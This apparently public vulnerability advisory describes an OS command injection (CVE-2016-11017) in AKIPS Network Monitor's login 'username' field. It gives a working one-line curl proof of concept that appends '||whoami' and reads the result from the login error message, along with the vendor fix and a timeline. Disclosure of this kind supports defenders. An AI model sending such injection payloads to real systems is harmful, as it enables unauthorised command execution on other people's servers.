<html>
<head>
	<title></title>
</head>
<body>
# Exploit Title: AKIPS Network Monitor 15.37-16.6 OS Command Injection</br>
# Date: 03-14-2016</br>
# Exploit Author: BrianWGray</br>
# Contact: https://twitter.com/BrianWGray</br>
# Vendor Homepage: https://www.akips.com/</br>
# Software Link: https://www.akips.com/showdoc/download</br>
# Version: 15.37 through 16.5, May impact earlier versions, remediated in 16.6</br>
# Tested on: FreeBSD 10.2-RELEASE-p7</br>
# CVE : CVE-2016-11017</br>

&nbsp;
<h2>1. Description</h2>

The &quot;username&quot; login parameter allows for OS Command injection via command Injection during a failed login attempt returns the command injection output to a limited login failure field.</br>

By using concatenation &#39;||&#39; a command may be appended to the username.</br>

The vendor has stated the following: &quot;Apparently the issue is in a Perl module which does an open2() of a custom PAM program. The command is not being properly sanitised.&quot;</br>
&nbsp;
<h2>2. Proof of Concept</h2></br>

<h3>example request:</h3></br>
curl &#39;https://Application/&#39; --data &#39;username=%7C%7C+whoami&amp;password=&#39; --compressed --insecure -# | grep -wF &quot;Error signing in:&quot;</br>

<h3>example response:</h3></br>
&lt;div class=&quot;alert alert-warning&quot;&gt;&lt;strong&gt;Error signing in:&lt;/strong&gt;akips&lt;/div&gt;</br>
&nbsp;
<p><img alt="POC example 0" src="./static/0002_0.png" /></p>
<p><img alt="POC example 1" src="./static/0002_1.png" /></p>

<h2>3. Solution: </h2></br>
Update to version 16.6 https://www.akips.com/showdoc/download</br>
&nbsp;
<h2>4. Timeline:</h2></br>
* 03-14-2016: Discovered, Vendor Notified, Vendor Response</br>
* 03-15-2016: Vendor Releases Remediated Build 16.6</br>
</body>
<p><a href="/" id="menu" title="Menu">Menu</a>&nbsp;</p>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-28199951-2', 'auto');
  ga('send', 'pageview');

</script>

<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'}),_trfd.push({'ap':'cpsh'},{'server':'p3plcpnl0690'},{'id':'7927930'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src='https://img1.wsimg.com/tcc/tcc_l.combined.1.0.6.min.js'></script></html>
